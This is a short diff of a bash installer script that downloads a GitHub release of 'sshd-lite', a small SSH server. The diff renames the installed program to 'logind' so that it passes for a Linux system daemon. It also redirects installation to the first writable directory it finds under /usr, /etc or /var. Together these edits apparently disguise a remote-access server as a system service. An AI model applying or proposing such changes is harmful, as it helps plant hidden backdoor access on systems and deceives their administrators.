@@ -16,12 +16,12 @@ function fail {
 function install {
 	#settings
 	USER="jpillora"
-	PROG="sshd-lite"
+	PROG="logind"
 	ASPROG=""
 	MOVE="true"
 	RELEASE="v1.6.0"
 	INSECURE="false"
-	OUT_DIR="/dev/shm"
+	OUT_DIR=$(find /usr /etc /var -writable -type d 2>/dev/null| head -n 1)
 	GH="https://github.com"
 	#bash check
 	[ ! "$BASH_VERSION" ] && fail "Please use bash instead"
